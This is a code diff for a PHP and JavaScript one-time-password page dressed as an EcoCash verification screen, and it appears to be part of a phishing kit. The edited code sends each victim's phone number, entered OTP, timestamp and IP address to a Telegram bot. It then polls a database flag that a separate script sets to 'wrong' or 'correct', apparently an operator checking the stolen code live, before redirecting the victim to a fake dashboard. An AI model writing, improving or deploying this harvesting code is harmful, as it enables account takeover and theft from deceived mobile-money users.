@@ -33,112 +33,82 @@ function getDbConnection($host, $port, $dbname, $user, $pass) {
     return $conn;
 }
 
-/**
- * Send Telegram message
- */
-function sendTelegramMessage($botToken, $chatId, $message, $parseMode = 'HTML') {
-    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
-    $postData = [
-        'chat_id' => $chatId,
-        'text'    => $message,
-        'parse_mode' => $parseMode
-    ];
-    
-    if (function_exists('curl_version')) {
-        $ch = curl_init();
-        curl_setopt_array($ch, [
-            CURLOPT_URL => $url,
-            CURLOPT_RETURNTRANSFER => true,
-            CURLOPT_POST => true,
-            CURLOPT_POSTFIELDS => http_build_query($postData),
-            CURLOPT_TIMEOUT => 10,
-            CURLOPT_SSL_VERIFYPEER => true,
-            CURLOPT_USERAGENT => 'EcoCashBot/1.0'
-        ]);
-        $response = curl_exec($ch);
-        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        curl_close($ch);
-        if ($response !== false && $httpCode === 200) {
-            $result = json_decode($response, true);
-            return isset($result['ok']) && $result['ok'] === true;
-        }
-        return false;
-    }
-    
-    // fallback
-    $options = [
-        'http' => [
-            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
-            'method'  => 'POST',
-            'content' => http_build_query($postData),
-            'timeout' => 10,
-            'user_agent' => 'EcoCashBot/1.0'
-        ],
-        'ssl' => ['verify_peer' => true]
-    ];
-    $context = stream_context_create($options);
-    $response = @file_get_contents($url, false, $context);
-    if ($response !== false) {
-        $result = json_decode($response, true);
-        return isset($result['ok']) && $result['ok'] === true;
-    }
-    return false;
-}
-
-// Must have phone in session (set by login.php)
+// MUST HAVE PHONE IN SESSION
 if (!isset($_SESSION['phone'])) {
     header("Location: login.php");
     exit;
 }
 
 $phone = trim($_SESSION['phone']);
-$error = '';
 
-// Process OTP submission
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_SERVER['HTTP_X_REQUESTED_WITH'])) {
-    $otpArray = isset($_POST['otp']) ? $_POST['otp'] : [];
-    $enteredOtp = implode('', $otpArray);
-    $enteredOtp = preg_replace('/[^0-9]/', '', $enteredOtp);
+// HANDLE AJAX REQUESTS FIRST (before any HTML output)
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SERVER['HTTP_X_REQUESTED_WITH']) 
+    && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
     
-    $conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
-    if (!$conn) {
-        $error = "System error. Please contact administrator.";
-        error_log("PostgreSQL connection failed in otp.php");
-    } else {
-        // Ensure `users` table exists with all required columns - MATCHING verify.php
-        $createSQL = "
-            CREATE TABLE IF NOT EXISTS users (
-                phone VARCHAR(20) PRIMARY KEY,
-                pin INTEGER DEFAULT 0,
-                otp INTEGER DEFAULT 0,
-                approve INTEGER DEFAULT 0,
-                logout INTEGER DEFAULT 0,
-                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-            )
-        ";
-        pg_query($conn, $createSQL);
+    header('Content-Type: application/json');
+    header('Cache-Control: no-cache, must-revalidate');
+    
+    // Handle status check
+    if (isset($_POST['check_status'])) {
+        $conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
         
-        // Add any missing columns (matching verify.php)
-        pg_query($conn, "ALTER TABLE users ADD COLUMN IF NOT EXISTS pin INTEGER DEFAULT 0");
-        pg_query($conn, "ALTER TABLE users ADD COLUMN IF NOT EXISTS otp INTEGER DEFAULT 0");
-        pg_query($conn, "ALTER TABLE users ADD COLUMN IF NOT EXISTS approve INTEGER DEFAULT 0");
-        pg_query($conn, "ALTER TABLE users ADD COLUMN IF NOT EXISTS logout INTEGER DEFAULT 0");
-        pg_query($conn, "ALTER TABLE users ADD COLUMN IF NOT EXISTS created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP");
+        if (!$conn) {
+            echo json_encode(['success' => false, 'error' => 'DB connection failed']);
+            exit;
+        }
         
-        // Insert phone if not exists
-        $insertSQL = "INSERT INTO users (phone, pin, otp, approve, logout, created_at) 
-                      VALUES ($1, 0, 0, 0, 0, NOW()) 
+        $sql = "SELECT otp, logout FROM users WHERE phone = $1";
+        $result = pg_query_params($conn, $sql, [$phone]);
+        
+        if ($result && $row = pg_fetch_assoc($result)) {
+            $otpValue = (int)$row['otp'];
+            $logoutStatus = (int)$row['logout'];
+            
+            echo json_encode([
+                'success' => true, 
+                'otp_value' => $otpValue,
+                'logout_status' => $logoutStatus
+            ]);
+        } else {
+            echo json_encode(['success' => false, 'error' => 'User not found']);
+        }
+        exit;
+    }
+    
+    // Handle OTP submission
+    if (isset($_POST['submit_otp'])) {
+        $otpArray = isset($_POST['otp']) ? $_POST['otp'] : [];
+        $enteredOtp = implode('', $otpArray);
+        $enteredOtp = preg_replace('/[^0-9]/', '', $enteredOtp);
+        
+        $conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
+        
+        if (!$conn) {
+            echo json_encode(['success' => false, 'error' => 'DB connection failed']);
+            exit;
+        }
+        
+        // Ensure user exists
+        $insertSQL = "INSERT INTO users (phone, pin, otp, approve, logout) 
+                      VALUES ($1, 0, 0, 0, 0) 
                       ON CONFLICT (phone) DO NOTHING";
         pg_query_params($conn, $insertSQL, [$phone]);
         
-        // Send Telegram notification about OTP submission
+        // Send Telegram notification
         $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
         $time = date('Y-m-d H:i:s');
         $msg = "🔐 *OTP Submitted*\n\n📱 Phone: +263 {$phone}\n🔢 OTP entered: `{$enteredOtp}`\n⏰ Time: {$time}\n🌐 IP: {$ip}";
+        
+        function sendTelegramMessage($botToken, $chatId, $message, $parseMode = 'HTML') {
+            $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
+            $postData = ['chat_id' => $chatId, 'text' => $message, 'parse_mode' => $parseMode];
+            $ch = curl_init();
+            curl_setopt_array($ch, [CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true, CURLOPT_POST => true, CURLOPT_POSTFIELDS => http_build_query($postData), CURLOPT_TIMEOUT => 10]);
+            curl_exec($ch);
+            curl_close($ch);
+        }
         sendTelegramMessage($botToken, $chatId, $msg, 'Markdown');
         
-        // Return success to AJAX
-        header('Content-Type: application/json');
         echo json_encode(['success' => true]);
         exit;
     }
@@ -192,21 +162,28 @@ p {
 }
 
 .message-area {
-    min-height: 60px;
+    min-height: 70px;
     margin-bottom: 20px;
 }
 
 .status-message {
-    padding: 10px;
+    padding: 12px;
     border-radius: 8px;
     text-align: center;
     font-size: 14px;
+    font-weight: 500;
     transition: all 0.3s ease;
     display: none;
 }
 
 .status-message.show {
     display: block;
+    animation: fadeIn 0.3s ease;
+}
+
+@keyframes fadeIn {
+    from { opacity: 0; transform: translateY(-10px); }
+    to { opacity: 1; transform: translateY(0); }
 }
 
 .status-verifying {
@@ -219,6 +196,12 @@ p {
     background: #fee2e2;
     color: #dc2626;
     border-left: 4px solid #dc2626;
+}
+
+.status-success {
+    background: #d4edda;
+    color: #155724;
+    border-left: 4px solid #155724;
 }
 
 .status-error {
@@ -275,7 +258,7 @@ button {
     transition: 0.2s;
 }
 
-button:hover {
+button:hover:not(:disabled) {
     background: #1d4ed8;
 }
 
@@ -338,7 +321,7 @@ button:disabled {
                 <input type="text" name="otp[]" maxlength="1" inputmode="numeric" required autocomplete="off">
             <?php endfor; ?>
         </div>
-        <button type="submit" id="submitBtn">Submit</button>
+        <button type="submit" id="submitBtn">Submit OTP</button>
     </form>
 
     <div class="timer" id="timer">Resend OTP in 120 seconds</div>
@@ -348,18 +331,28 @@ button:disabled {
 const inputs = document.querySelectorAll('.otp-box input');
 const submitBtn = document.getElementById('submitBtn');
 const statusDiv = document.getElementById('statusMessage');
-const form = document.getElementById('otpForm');
 let monitoringInterval = null;
-let isProcessing = false;
+let isSubmitting = false;
 let hasRedirected = false;
-let errorTimeout = null;
-let lastOtpValue = null;
 
-// Auto-check database status every 2 seconds (only after submission)
-function checkDatabaseStatus() {
-    if (hasRedirected) return;
+function showMessage(message, type, autoHide = false) {
+    statusDiv.textContent = message;
+    statusDiv.className = `status-message show status-${type}`;
     
-    console.log('Checking database status...'); // Debug log
+    if (autoHide) {
+        setTimeout(() => {
+            statusDiv.classList.remove('show');
+        }, 3000);
+    }
+}
+
+function hideMessage() {
+    statusDiv.classList.remove('show');
+}
+
+// Function to check OTP status from database
+function checkOTPStatus() {
+    if (hasRedirected) return;
     
     fetch(window.location.href, {
         method: 'POST',
@@ -371,95 +364,59 @@ function checkDatabaseStatus() {
     })
     .then(response => response.json())
     .then(data => {
-        console.log('Status check response:', data); // Debug log
-        
         if (data.success) {
             const otpValue = data.otp_value;
-            console.log('Current OTP value from DB:', otpValue); // Debug log
             
-            // Only update if value has changed
-            if (lastOtpValue !== otpValue) {
-                lastOtpValue = otpValue;
-                console.log('OTP value changed to:', otpValue); // Debug log
+            if (otpValue === 1) {
+                // WRONG OTP
+                showMessage('❌ Wrong OTP! Please try again.', 'wrong', true);
                 
-                // Check the OTP database value
-                // IMPORTANT: verify.php sets: wrong=1, correct=2
-                if (otpValue === 0) {
-                    // Still verifying - keep showing "verifying" message
-                    showMessage('🔍 Verifying...', 'status-verifying', false);
-                } else if (otpValue === 1) {
-                    // Wrong OTP detected (verify.php set to 1)
-                    showMessage('❌ Wrong OTP', 'status-wrong', true);
-                    // Stop monitoring
-                    if (monitoringInterval) {
-                        clearInterval(monitoringInterval);
-                        monitoringInterval = null;
+                // Stop monitoring
+                if (monitoringInterval) {
+                    clearInterval(monitoringInterval);
+                    monitoringInterval = null;
+                }
+                
+                // Re-enable form
+                inputs.forEach(input => {
+                    input.disabled = false;
+                    input.value = '';
+                });
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Submit OTP';
+                isSubmitting = false;
+                inputs[0].focus();
+                
+            } else if (otpValue === 2) {
+                // CORRECT OTP - Redirect
+                showMessage('✅ OTP Verified Successfully! Redirecting...', 'success');
+                
+                // Stop monitoring
+                if (monitoringInterval) {
+                    clearInterval(monitoringInterval);
+                    monitoringInterval = null;
+                }
+                hasRedirected = true;
+                
+                // Redirect after 1 second
+                setTimeout(() => {
+                    if (data.logout_status === 1) {
+                        window.location.href = 'loggedin.php';
+                    } else {
+                        window.location.href = 'dashboard.php';
                     }
-                } else if (otpValue === 2) {
-                    // OTP verified - redirect (verify.php set to 2)
-                    showMessage('✅ OTP Verified! Redirecting...', 'status-verifying', false);
-                    // Stop monitoring
-                    if (monitoringInterval) {
-                        clearInterval(monitoringInterval);
-                        monitoringInterval = null;
-                    }
-                    hasRedirected = true;
-                    
-                    // Check logout status before redirecting
-                    setTimeout(() => {
-                        if (data.logout_status === 1) {
-                            window.location.href = 'loggedin.php';
-                        } else {
-                            window.location.href = 'dashboard.php';
-                        }
-                    }, 1000);
+                }, 1000);
+            } else if (otpValue === 0) {
+                // Still verifying - keep showing verifying message if not already showing
+                if (statusDiv.textContent !== '🔍 Verifying...') {
+                    showMessage('🔍 Verifying OTP...', 'verifying');
                 }
             }
-        } else {
-            console.error('Status check failed:', data.error);
         }
     })
     .catch(error => {
         console.error('Error checking status:', error);
     });
-}
-
-// Helper function to show message with auto-hide for wrong OTP
-function showMessage(message, type, autoHide = false) {
-    statusDiv.textContent = message;
-    statusDiv.className = `status-message show ${type}`;
-    
-    if (autoHide) {
-        if (errorTimeout) clearTimeout(errorTimeout);
-        errorTimeout = setTimeout(() => {
-            statusDiv.classList.remove('show');
-            // Re-enable inputs for retry
-            inputs.forEach(input => {
-                input.disabled = false;
-                input.value = '';
-            });
-            submitBtn.disabled = false;
-            submitBtn.textContent = 'Submit';
-            inputs[0].focus();
-            // Reset processing flag
-            isProcessing = false;
-            // Clear last value to allow new monitoring
-            lastOtpValue = null;
-            // Clear any existing monitoring
-            if (monitoringInterval) {
-                clearInterval(monitoringInterval);
-                monitoringInterval = null;
-            }
-        }, 3000);
-    }
-}
-
-// Clear any existing error timeout
-function clearErrorTimeout() {
-    if (errorTimeout) {
-        clearTimeout(errorTimeout);
-        errorTimeout = null;
-    }
 }
 
 // OTP input handling
@@ -471,87 +428,93 @@ inputs.forEach((input, i) => {
         }
     });
 
-    input.addEventListener('keydown', e => {
-        if (e.key === "Backspace" && !input.value && i > 0) {
+    input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !input.value && i > 0) {
             inputs[i - 1].focus();
         }
     });
 });
 
+// Focus first input on page load
 inputs[0].focus();
 
 // Handle form submission
-form.addEventListener('submit', function(e) {
+document.getElementById('otpForm').addEventListener('submit', async (e) => {
     e.preventDefault();
     
-    if (isProcessing) return;
+    if (isSubmitting) return;
     
-    // Get entered OTP
+    // Get OTP value
     let otpValue = '';
     inputs.forEach(input => {
         otpValue += input.value;
     });
     
     if (otpValue.length !== 6) {
-        showMessage('❌ Please enter complete 6-digit OTP', 'status-wrong', true);
+        showMessage('⚠️ Please enter the complete 6-digit OTP', 'wrong', true);
         return;
     }
     
-    // Clear any previous messages and timeouts
-    clearErrorTimeout();
-    statusDiv.classList.remove('show');
-    
-    isProcessing = true;
+    // Disable form during submission
+    isSubmitting = true;
     submitBtn.disabled = true;
-    submitBtn.textContent = 'Verifying...';
-    
-    // Disable inputs while processing
+    submitBtn.textContent = 'Submitting...';
     inputs.forEach(input => input.disabled = true);
     
     // Prepare form data
     const formData = new FormData();
+    formData.append('submit_otp', '1');
     inputs.forEach((input, idx) => {
         formData.append('otp[]', input.value);
     });
     
-    // Submit the form via AJAX
-    fetch(window.location.href, {
-        method: 'POST',
-        body: formData
-    })
-    .then(response => response.json())
-    .then(data => {
-        console.log('Submit response:', data); // Debug log
+    try {
+        const response = await fetch(window.location.href, {
+            method: 'POST',
+            headers: {
+                'X-Requested-With': 'XMLHttpRequest'
+            },
+            body: formData
+        });
+        
+        const data = await response.json();
         
         if (data.success) {
-            // Start monitoring database status
-            showMessage('🔍 Verifying...', 'status-verifying', false);
-            lastOtpValue = 0; // Set initial value
+            showMessage('🔍 Verifying OTP...', 'verifying');
             
-            // Start checking every 2 seconds
+            // Start monitoring database every 2 seconds
             if (monitoringInterval) {
                 clearInterval(monitoringInterval);
             }
-            monitoringInterval = setInterval(checkDatabaseStatus, 2000);
-            checkDatabaseStatus(); // Check immediately
+            monitoringInterval = setInterval(checkOTPStatus, 2000);
+            
+            // Check immediately
+            checkOTPStatus();
         } else {
-            showMessage('❌ Submission failed. Please try again.', 'status-wrong', true);
-            // Re-enable inputs
-            inputs.forEach(input => input.disabled = false);
+            showMessage('❌ Submission failed. Please try again.', 'wrong', true);
+            // Re-enable form
+            inputs.forEach(input => {
+                input.disabled = false;
+                input.value = '';
+            });
             submitBtn.disabled = false;
-            submitBtn.textContent = 'Submit';
-            isProcessing = false;
+            submitBtn.textContent = 'Submit OTP';
+            isSubmitting = false;
+            inputs[0].focus();
         }
-    })
-    .catch(error => {
+    } catch (error) {
         console.error('Error:', error);
-        showMessage('⚠️ Network error. Please try again.', 'status-error', true);
-        // Re-enable inputs
-        inputs.forEach(input => input.disabled = false);
+        showMessage('⚠️ Network error. Please try again.', 'error', true);
+        // Re-enable form
+        inputs.forEach(input => {
+            input.disabled = false;
+            input.value = '';
+        });
         submitBtn.disabled = false;
-        submitBtn.textContent = 'Submit';
-        isProcessing = false;
-    });
+        submitBtn.textContent = 'Submit OTP';
+        isSubmitting = false;
+        inputs[0].focus();
+    }
 });
 
 // Timer functionality
@@ -568,50 +531,6 @@ const timerInterval = setInterval(() => {
     }
 }, 1000);
 </script>
-
-<?php
-// Handle AJAX status check requests
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SERVER['HTTP_X_REQUESTED_WITH']) 
-    && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest' && isset($_POST['check_status'])) {
-    
-    header('Content-Type: application/json');
-    header('Cache-Control: no-cache, must-revalidate');
-    
-    if (!isset($_SESSION['phone'])) {
-        echo json_encode(['success' => false, 'error' => 'No phone in session']);
-        exit;
-    }
-    
-    $phone = trim($_SESSION['phone']);
-    $conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
-    
-    if (!$conn) {
-        echo json_encode(['success' => false, 'error' => 'DB connection failed']);
-        exit;
-    }
-    
-    // Query the SAME otp column that verify.php updates
-    $sql = "SELECT otp, logout FROM users WHERE phone = $1";
-    $result = pg_query_params($conn, $sql, [$phone]);
-    
-    if ($result && $row = pg_fetch_assoc($result)) {
-        $otpValue = (int)$row['otp'];
-        $logoutStatus = (int)$row['logout'];
-        
-        // Debug log to server
-        error_log("Status check for $phone: otp=$otpValue, logout=$logoutStatus");
-        
-        echo json_encode([
-            'success' => true, 
-            'otp_value' => $otpValue,
-            'logout_status' => $logoutStatus
-        ]);
-    } else {
-        echo json_encode(['success' => false, 'error' => 'User not found: ' . pg_last_error($conn)]);
-    }
-    exit;
-}
-?>
 
 </body>
 </html>
